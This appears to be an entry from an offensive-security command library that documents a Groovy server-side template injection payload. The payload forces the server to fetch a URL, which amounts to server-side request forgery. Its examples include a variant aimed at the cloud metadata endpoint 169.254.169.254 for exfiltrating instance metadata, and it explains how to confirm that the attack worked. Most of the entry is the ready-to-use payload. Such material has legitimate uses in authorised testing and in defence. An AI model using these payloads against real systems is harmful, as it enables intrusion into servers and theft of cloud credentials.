---
type: command
executor: groovy
data: '${new URL("http://$_TARGET_URL").getText()}'
output: null
tags:
  - ssti
  - groovy
  - ssrf
platforms:
  - web
  - java
verified: true
validated: true
---

# groovy-ssti-fetch-url-new-url-gettext

## Command

```groovy
${new URL("http://$_TARGET_URL").getText()}
```

## Description

This Groovy expression creates a new URL object from a string and calls its getText() method to perform an HTTP GET request and retrieve the response as a string. Used in SSTI to execute SSRF on the server-side, enabling access to external or internal resources controlled by the attacker.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The target URL or hostname to fetch (e.g., an attacker-controlled endpoint for request confirmation) | Yes |

## Examples

### Basic Usage

```groovy
${new URL("http://www.google.com").getText()}
```

### Advanced Usage

```groovy
${new URL("http://169.254.169.254/latest/meta-data/").getText()}
```

For exfiltrating cloud metadata via SSTI.

## Expected Output

The raw text content of the requested URL, e.g.,:

```
<html><head><title>Google</title>...</head><body>...</body></html>
```

Success in SSTI is confirmed if the response includes this content or if server logs show the outbound request.

## Related

- [[procedures/Server-Side-Template-Injection-via-Groovy-HTTP-Request]]
- [[commands/groovy-ssti-fetch-url-string-to-url]]
